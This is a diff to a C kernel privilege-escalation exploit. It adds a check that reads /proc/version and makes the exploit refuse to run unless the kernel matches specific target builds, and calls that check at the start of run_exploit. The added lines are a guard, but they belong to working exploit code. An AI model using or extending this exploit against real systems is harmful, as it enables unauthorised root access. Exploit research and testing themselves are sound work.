@@ -23,6 +23,20 @@ uint64_t kaslr_slide;
 #define DIRECT_READ_ATTEMPTS 10
 #define DIRECT_EFFECT_ATTEMPTS 10
 
+static int verify_target_kernel(void) {
+  char version[512];
+  read_first_line("/proc/version", version, sizeof(version));
+  int release_ok = strstr(version, TARGET_KERNEL_RELEASE) != NULL;
+  int build_ok = strstr(version, TARGET_SLOT_A_VERSION_MARKER) != NULL ||
+                 strstr(version, TARGET_SLOT_B_VERSION_MARKER) != NULL;
+  if (!release_ok || !build_ok) {
+    pr_warning("unsupported kernel; refusing exploit: %s\n", version);
+    return 0;
+  }
+  pr_success("target kernel accepted: %s\n", version);
+  return 1;
+}
+
 void *waiter_thread(void *arg __attribute__((unused))) {
   disable_rseq_for_thread();
 
@@ -718,6 +732,9 @@ int run_exploit(int argc, char **argv) {
   set_limit();
   (void)argc;
   (void)argv;
+  if (!verify_target_kernel()) {
+    return 3;
+  }
   if (!init_direct_root_cpu()) {
     pr_error("runtime performance CPU detection failed errno=%d\n", errno);
     return 1;
